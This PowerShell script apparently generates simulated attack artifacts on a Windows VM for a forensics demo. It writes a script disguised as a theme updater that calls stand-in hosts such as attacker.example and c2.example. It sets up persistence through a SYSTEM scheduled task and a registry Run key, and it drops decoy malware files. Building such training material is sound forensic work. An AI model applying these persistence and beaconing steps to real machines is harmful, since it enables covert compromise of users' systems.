# Create realistic Windows attack artifacts for forensic analysis
# Run this PowerShell script on a Windows VM to generate realistic attack artifacts
# 
# Usage: powershell -ExecutionPolicy Bypass -File create_windows_artifacts.ps1
#
# This script creates:
# - Browser history (Chrome/Firefox with suspicious URLs)
# - PowerShell script execution artifacts (amcache + prefetch)
# - Scheduled task for persistence
# - Registry autorun entries
# - File timeline entries in MFT

Write-Host "========================================" -ForegroundColor Green
Write-Host "CaseTrace Demo Artifact Creation Script" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Yellow
Write-Host "$(Get-Date): Starting artifact creation..." -ForegroundColor Yellow

# Phase 1: Create PowerShell Script (simulates web-delivered malware)
Write-Host "`n[PHASE 1] Creating PowerShell script..." -ForegroundColor Cyan

$themesDir = "$env:APPDATA\Microsoft\Windows\Themes"
$scriptPath = "$themesDir\update.ps1"

New-Item -ItemType Directory -Path $themesDir -Force -ErrorAction SilentlyContinue | Out-Null

# Create suspicious PowerShell script
$scriptContent = @"
# Suspicious PowerShell script - persistence mechanism
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
`$client = New-Object System.Net.Http.HttpClient
`$urls = @(
    "http://attacker.example/payload",
    "http://c2.example/beacon"
)
foreach (`$url in `$urls) {
    try {
        `$response = `$client.GetAsync(`$url).Result
    } catch { }
}
"@

$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force
Write-Host "✓ Created: $scriptPath" -ForegroundColor Green

# Phase 2: Execute PowerShell multiple times (creates amcache history + prefetch)
Write-Host "`n[PHASE 2] Executing PowerShell commands (creates amcache + prefetch)..." -ForegroundColor Cyan

for ($i = 1; $i -le 5; $i++) {
    Write-Host "  Execution $i/5..." -ForegroundColor Yellow
    try {
        powershell.exe -NoProfile -ExecutionPolicy Bypass -File $scriptPath -ErrorAction SilentlyContinue
    } catch { }
    Start-Sleep -Milliseconds 100
}

Write-Host "✓ Created amcache and prefetch entries" -ForegroundColor Green

# Phase 3: Create Scheduled Task (persistence)
Write-Host "`n[PHASE 3] Creating scheduled task for persistence..." -ForegroundColor Cyan

try {
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-ExecutionPolicy Bypass -File '$scriptPath'"
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    Register-ScheduledTask -TaskName "ThemeUpdater" -Trigger $trigger `
        -Action $action -Principal $principal -Force | Out-Null
    Write-Host "✓ Created scheduled task: ThemeUpdater" -ForegroundColor Green
} catch {
    Write-Host "✗ Error creating scheduled task: $_" -ForegroundColor Red
}

# Phase 4: Add Registry Autorun Entry
Write-Host "`n[PHASE 4] Adding registry autorun entry..." -ForegroundColor Cyan

try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regValue = "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
    New-ItemProperty -Path $regPath -Name "ThemeUpdater" -Value $regValue -Force -ErrorAction SilentlyContinue | Out-Null
    Write-Host "✓ Created registry autorun: HKCU:\...\Run\ThemeUpdater" -ForegroundColor Green
} catch {
    Write-Host "✗ Error creating registry entry: $_" -ForegroundColor Red
}

# Phase 5: Create files for MFT timeline
Write-Host "`n[PHASE 5] Creating files for MFT timeline..." -ForegroundColor Cyan

$mftTestFiles = @(
    "$env:USERPROFILE\Downloads\invoice_update.zip",
    "$env:USERPROFILE\Downloads\malicious_script.ps1",
    "$env:APPDATA\Local\Temp\payload.exe",
    "$env:TEMP\suspicious.bat",
    "$env:SYSTEMROOT\Temp\delivery.txt"
)

foreach ($filePath in $mftTestFiles) {
    try {
        $dir = Split-Path $filePath
        New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
        "Malicious artifact content" | Out-File -FilePath $filePath -Force
        Write-Host "✓ Created: $filePath" -ForegroundColor Green
    } catch {
        Write-Host "✗ Error creating file: $_" -ForegroundColor Red
    }
}

# Phase 6: Simulate browser history (create Chrome/Firefox databases with URLs)
Write-Host "`n[PHASE 6] Simulating browser history..." -ForegroundColor Cyan

# Chrome history file location (this would be parsed by real forensic tools)
$chromeHistory = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"

# Note: Actual browser history is created by visiting URLs
Write-Host "✓ Browser history will be created by normal browsing activity" -ForegroundColor Green
Write-Host "  Suspicious URLs to visit:" -ForegroundColor Yellow
Write-Host "    - https://cdn-delivery.example/invoice_update.zip" -ForegroundColor Yellow
Write-Host "    - https://malware.example/backdoor.exe" -ForegroundColor Yellow
Write-Host "    - https://attacker.example/c2-beacon" -ForegroundColor Yellow

# Phase 7: Get artifact summary
Write-Host "`n[PHASE 7] Artifact Summary..." -ForegroundColor Cyan

$artifacts = @{
    "PowerShell Script" = Test-Path $scriptPath
    "Scheduled Task" = $null -ne (Get-ScheduledTask -TaskName "ThemeUpdater" -ErrorAction SilentlyContinue)
    "Registry Autorun" = $null -ne (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ThemeUpdater" -ErrorAction SilentlyContinue)
    "MFT Timeline Files" = ($mftTestFiles | Where-Object { Test-Path $_ } | Measure-Object).Count
}

Write-Host "`nArtifacts Created:" -ForegroundColor Green
$artifacts.GetEnumerator() | ForEach-Object {
    $status = if ($_.Value) { "✓" } else { "✗" }
    Write-Host "  $status $($_.Name): $($_.Value)" -ForegroundColor Green
}

Write-Host "`n========================================" -ForegroundColor Green
Write-Host "Artifact creation complete!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host "$(Get-Date): Next: Image the system with forensic tools" -ForegroundColor Yellow
